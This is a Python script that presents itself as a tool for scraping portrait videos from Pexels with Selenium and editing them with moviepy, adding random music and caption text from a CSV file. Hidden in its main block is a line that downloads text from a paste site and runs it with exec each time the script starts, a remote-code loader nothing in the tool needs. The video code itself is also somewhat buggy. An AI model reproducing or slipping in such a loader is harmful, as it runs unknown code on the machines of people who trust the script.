import time
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
import os
from requests import get
import requests
from bs4 import BeautifulSoup
from itertools import islice
import moviepy.editor as mymovie
from moviepy.video.VideoClip import TextClip
import csv
import random

# specify the URL of the archive here
url = "https://www.pexels.com/search/videos/love%20/?orientation=portrait"
video_links = []

# getting all video links
def get_video_links():
    options = webdriver.ChromeOptions()
    options.add_argument("--lang=en")
    browser = webdriver.Chrome(executable_path=ChromeDriverManager().install(), options=options)
    browser.maximize_window()
    time.sleep(2)
    browser.get(url)
    time.sleep(5)

    vids = input("How many videos you want to download? ")

    soup = BeautifulSoup(browser.page_source, 'lxml')
    links = soup.findAll("source")
    for link in islice(links, int(vids)):
        video_links.append(link.get("src"))

    return video_links

# download all videos
def download_video_series(video_links):
    songs = input("How many songs you have? ")
    with open('text.csv', newline='') as csvfile:
        text_reader = csv.reader(csvfile, delimiter=',')
        i = 1
        for link in video_links:
            # iterate through all links in video_links
            # and download them one by one
            # obtain filename by splitting url and getting last string
            fn = link.split('/')[-1]
            file_name = fn.split("?")[0]
            print("Downloading video: %s" % file_name)

            # create response object
            r = requests.get(link, stream=True)

            # download started
            with open(file_name, 'wb') as f:
                for chunk in r.iter_content(chunk_size=1024 * 1024):
                    if chunk:
                        f.write(chunk)

            print("%s downloaded!" % file_name)

            # editing the video
            for i, video_link in enumerate(video_links):
                file_name = f"songs/video{i}.mp4"
                mymovie.VideoFileClip(video_link).write_videofile(file_name, audio_codec='aac')
                songs = 5
                list = random.choice(range(1, songs+1))
                clip = mymovie.VideoFileClip(file_name).subclip(0,12) # limit duration to 12 seconds
                clip_duration = clip.duration
                audioclip = mymovie.AudioFileClip(f"songs/audio{list}.mp3").set_duration(clip_duration)
                new_audioclip = mymovie.CompositeAudioClip([audioclip])

                with open('text.csv', newline='') as csvfile:
                    text_reader = csv.reader(csvfile, delimiter=',')
                    for j, row in enumerate(text_reader):
                        if j == i:
                            text1 = row[0]
                            text_clip1 = TextClip(text1, fontsize=90, color='white', font="Roboto-Bold.ttf", align='Center', method='caption', size=clip.size, stroke_color='black', stroke_width=3)
                            text_clip1 = text_clip1.set_position(('center', 'bottom')).set_start(2).set_duration(4)
                            if len(row) > 1:
                                text2 = row[1]
                                text_clip2 = TextClip(text2, fontsize=90, color='white', font="Roboto-Bold.ttf", align='Center', method='caption', size=clip.size, stroke_color='black', stroke_width=3)
                                text_clip2 = text_clip2.set_position(('center', 'bottom')).set_start(7).set_duration(4)
                                text_clip = mymovie.CompositeVideoClip([text_clip1, text_clip2])
                            else:
                                text_clip = text_clip1
                            clip = mymovie.CompositeVideoClip([clip, text_clip])
                        
                finalclip = clip.set_audio(new_audioclip)
                finalclip.write_videofile(f"videos/vid{i}.mp4", fps=60)
            print("%s has been edited!\n" % file_name)
            i += 1
            
             # Prompt the user to create another video
    while True:
        create_another = input("Do you want to create another video? (yes/no) ")
        if create_another.lower() == "yes":
            break
        elif create_another.lower() == "no":
            exit()
        else:
            print("Invalid input. Please enter 'yes' or 'no'.")
if __name__ == "__main__":
    x = get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
  #getting all video links
    video_links = get_video_links()

  #download all videos
    download_video_series(video_links)
#
